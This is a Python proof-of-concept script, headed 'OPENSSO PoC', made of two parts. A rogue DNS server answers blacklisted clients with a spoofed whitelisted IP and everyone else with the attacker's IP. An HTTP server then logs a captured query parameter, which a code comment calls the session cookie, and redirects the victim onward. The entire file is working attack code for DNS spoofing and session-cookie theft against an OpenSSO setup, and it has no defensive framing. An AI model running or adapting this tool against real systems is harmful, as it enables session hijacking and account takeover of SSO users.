import socket
import dnslib
import multiprocessing
import sys
import argparse

class DNSERVER():
    def __init__(self, blacklist=[], interface="0.0.0.0", port=53, ipToSpoof="127.0.0.1", realIP="127.0.0.1"):
        self.running = True
        self.blacklist = blacklist
        self.interface = interface
        self.port = port
        self.realIP = realIP
        self.ipToSpoof = ipToSpoof
        self.sDNS = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def start(self):
        self.sDNS.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sDNS.bind((self.interface, self.port))
        print("[*] Started DNS server on port {}".format(self.port))

        while self.running:
            data, addr = self.sDNS.recvfrom(512)
            parsedDNS = dnslib.DNSRecord.parse(data)

            # We send fake IP to adAS
            if(addr[0] in self.blacklist):
                ip = self.ipToSpoof
            else:
                ip = self.realIP

            
            print("[DNS] Response: {} -> {}".format(parsedDNS.questions[0].qname, ip))
            response = dnslib.DNSRecord(dnslib.DNSHeader(qr=1,aa=1,ra=1,id=parsedDNS.header.id), q=dnslib.DNSQuestion(parsedDNS.questions[0].qname), a=dnslib.RR(parsedDNS.questions[0].qname,rdata=dnslib.A(ip)))
            self.sDNS.sendto(response.pack(), addr)
        
        self.sDNS.close()

    def stop(self):
        try:
            self.running = False
            self.sDNS.close()
            print("[*] DNS Server killed")
        except Exception as e:
            print("[-] Error stopping DNS server, {}".format(e))

class HTTPSERVER():
    def __init__(self, interface="0.0.0.0", port=80, redirectUrl="http://github.com/wocanilo"):
        self.running = True
        self.interface = interface
        self.port = port
        self.redirectUrl = redirectUrl
        self.sHTTP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        self.sHTTP.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sHTTP.bind((self.interface, self.port))
        print("[*] Started HTTP server on port {}".format(self.port))

        while self.running:
            self.sHTTP.listen(2)
            conn, addr = self.sHTTP.accept()

            data = conn.recv(1024)

            # First parameter is the session cookie
            try:
                query = data.decode("UTF-8").rsplit()[1].split("?")[1].split("=")
                print("Captured parameter {} = {}".format(query[0], query[1]))
            except:
                print("[HTTP] Bad request parameters")
                query = ["", ""]

            # We redirect the user to the real page with the cookie
            conn.sendall("HTTP/1.1 301 Moved Permanently\r\nLocation: {}?{}={}\r\n\r\n".format(self.redirectUrl, query[0], query[1]).encode("UTF-8"))
            conn.close()
        
        self.sHTTP.close()

    def stop(self):
        try:
            self.running = False
            self.sHTTP.shutdown(socket.SHUT_RDWR)
            self.sHTTP.close()
            print("[*] HTTP Server killed")
        except Exception as e:
            print("[-] Error stopping HTTP server, {}".format(e))

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='OPENSSO PoC')
    parser.add_argument('ipToSpoof', type=str, help='whitelisted OPENSSO IP')
    parser.add_argument('realIP', type=str, help="server real IP")
    parser.add_argument('redirectUrl', help="URL to redirect users after Auth")
    parser.add_argument('ipBlacklist', nargs='+', help="list of blacklisted IPs")

    parser.add_argument('--interface', default="0.0.0.0", help='listening interface of the DNS and HTTP server (default: 0.0.0.0)')
    parser.add_argument('--httpPort', default=80, type=int, help='HTTP server port (default: 80)')
    parser.add_argument('--dnsPort', default=53, type=int, help='DNS server port (default: 53)')

    args = parser.parse_args()

    if(args.ipToSpoof != None and args.redirectUrl != None and args.ipBlacklist != None):
        httpServer = HTTPSERVER(args.interface, args.httpPort, args.redirectUrl)
        dnsServer = DNSERVER(args.ipBlacklist, args.interface, args.dnsPort, args.ipToSpoof, args.realIP)

        dns = multiprocessing.Process(target=dnsServer.start)
        http = multiprocessing.Process(target=httpServer.start)

        dns.start()
        http.start()

        input("")

        httpServer.stop()
        dnsServer.stop()

        dns.terminate()
        http.terminate()
    else:
        print(args.ipBlacklist)